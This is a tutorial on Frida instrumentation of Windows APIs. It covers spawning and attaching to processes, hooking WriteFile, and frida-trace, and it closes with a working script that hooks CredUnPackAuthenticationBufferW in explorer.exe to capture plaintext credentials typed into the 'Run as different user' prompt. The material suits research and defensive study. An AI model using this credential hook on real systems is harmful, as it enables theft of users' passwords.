# Instrumenting Windows APIs with Frida

## Instrumenting Windows APIs with Frida

[Frida](https://frida.re) is dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.

### Spawning New Process with Frida

We can ask frida to spawn a new process for us to instrument:

```
frida c:\windows\system32\notepad.exe
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MREjj5VbQjNFBi6YJAb%2F-MREl7G8sMgkNJkVqMzq%2Fimage.png?alt=media\&token=585aac06-af19-4418-99ae-9bd219e099b7)

### Attaching Frida to Existing Process

We can ask frida to attach to an existing process:

```
frida -p 10964
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MREjj5VbQjNFBi6YJAb%2F-MREloqiIXksEiFD6GqR%2Fimage.png?alt=media\&token=dd4cd2c7-2e35-4dfb-8fc4-f6f6f9b9728f)

### Hooking a Function

The below code in `hooking.js` will find address of the Windows API `WriteFile` (lives in kernel32.dll/kernelbase.dll) and hexdump the contents of the 1st argument passed to it:

{% code title="hooking.js" %}
```javascript
var writeFile = Module.getExportByName(null, "WriteFile");

Interceptor.attach(writeFile, {
    onEnter: function(args)
    {
        console.log("Buffer dump:\n" + hexdump(args[1]));
        // console.log("\nBuffer via Cstring:\n" + Memory.readCString(args[1]));
        // console.log("\nBuffer via utf8String:\n" + Memory.readUtf8String(args[1]));
    }
});
```
{% endcode %}

Let's spawn a new `notepad.exe` through Frida and supply it with the above `hooking.js` code, so that we can start instrumenting the `WriteFile` API and inspect the contents of the buffer that is being written to disk:

```
frida C:\windows\system32\notepad.exe -l .\hooking.js
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MREjj5VbQjNFBi6YJAb%2F-MRF6P76bABUYGNMotxI%2Ffrida-instrumenting-api.gif?alt=media\&token=92fe778d-39ba-4138-947c-cbbcb273be7d)

Notice that we can update the `hooking.js` code and the instrumentation happens instantly - it does not require us to re-spawn the notepad or re-attaching Frida to it. In the above GIF, this can be seen at the end when we request the console to spit out the `process.id` (the frida is attached to) and the notepad process ID gets printed out to the screen instantly.

### Frida-Trace

If we want to see if certain API calls are invoked by some specific process, say `WriteFile`, we can use `frida-trace` tool like so:

```
frida-trace -i "WriteFile" C:\windows\system32\notepad.exe
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MRF6pwSEnXv4zCGiU3e%2F-MRFMXJJT3Jg-F0QAKXO%2Ffrida-trace.gif?alt=media\&token=3f8b03c9-b53b-4767-9ca9-f1639bc32f87)

### Real Life Example - Intercepting Credentials

Below shows how we can combine the above knowledge for something a bit more interesting.

Can we intercept the plaintext credentials from the credentials prompt the user gets when they want to execute a program as another user?

![Credentials prompt presented for "Run as different user"](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MS6p0_7tb30afyzK35E%2F-MS8nkOVNGZOlkXu9GBO%2Fcredential-popup.gif?alt=media\&token=a70b11b3-7f4e-426a-bdbe-d844f2f5027d)

The answer is of course yes, so let's see how this could be done using Frida tools.

Let's use `frida-trace` to see if explorer.exe ever calls any functions named `*Cred*` when we invoke the credentials popup:

```
frida-trace -i "*Cred*" -p (ps explorer).id
```

Below, we can see that indeed, there is a call to `CredUIPromptForWindowsCredentialsW` made when the prompt is first invoked:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MS6p0_7tb30afyzK35E%2F-MS8pKH_-7zH38W5H97n%2Fcredential-popup-trace.gif?alt=media\&token=c02f23a3-c1d0-4162-8688-a1ddbfb53aaf)

Entering some fake credentials shows the following interesting `Cred*` API calls are made (in red):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MS6p0_7tb30afyzK35E%2F-MS8rZToc4SJpO2Xm8Bu%2Fimage.png?alt=media\&token=5a599a60-9723-48e0-ab19-486d8ab69a0a)

...and the [`CredUnPackAuthenticationBufferW`](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credunpackauthenticationbufferw) (in lime) is of special interest, because per MSDN:

> The **CredUnPackAuthenticationBuffer** function converts an authentication buffer returned by a call to the [CredUIPromptForWindowsCredentials](https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa) function into a string user name and password.

We can now instrument `CredUnPackAuthenticationBufferW` in a frida javascript like so:

{% code title="Credentials.js" %}
```javascript
var username;
var password;
var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

Interceptor.attach(CredUnPackAuthenticationBufferW, {
    onEnter: function (args) 
    {
        // Credentials here are still encrypted
        /*
            CREDUIAPI BOOL CredUnPackAuthenticationBufferW(
                0 DWORD  dwFlags,
                1 PVOID  pAuthBuffer,
                2 DWORD  cbAuthBuffer,
                3 LPWSTR pszUserName,
                4 DWORD  *pcchMaxUserName,
                5 LPWSTR pszDomainName,
                6 DWORD  *pcchMaxDomainName,
                7 LPWSTR pszPassword,
                8 DWORD  *pcchMaxPassword
            );        
        */
        username = args[3];
        password = args[7];
    },
    onLeave: function (result)
    {
        // Credentials are now decrypted
        var user = username.readUtf16String()
        var pass = password.readUtf16String()

        if (user && pass)
        {
            console.log("\n+ Intercepted Credentials\n" + user + ":" + pass)
        }
    }
});
```
{% endcode %}

We can now hook the explorer.exe by providing frida with our instrumentation script like so:

```
frida -p (ps explorer).id -l C:\labs\frida\hello-world\credentials.js
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MS6p0_7tb30afyzK35E%2F-MS8tpWLcIRjmK_wV0Eu%2Fimage.png?alt=media\&token=5153065e-49a4-4b48-b5c8-4c49ea2ecaee)

With `CredUnPackAuthenticationBufferW` instrumented, entering credentials in the prompt launched by explorer.exe, gives us the expected result - the credentials are seen in plaintext:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MS6p0_7tb30afyzK35E%2F-MS8wWGT5dGccHmFfFkO%2Fcredential-popup-capture-credentials.gif?alt=media\&token=e70bf295-a939-4256-97d7-f267ba0bccbf)

### Resources

{% embed url="https://frida.re/docs/javascript-api/#memory" %}
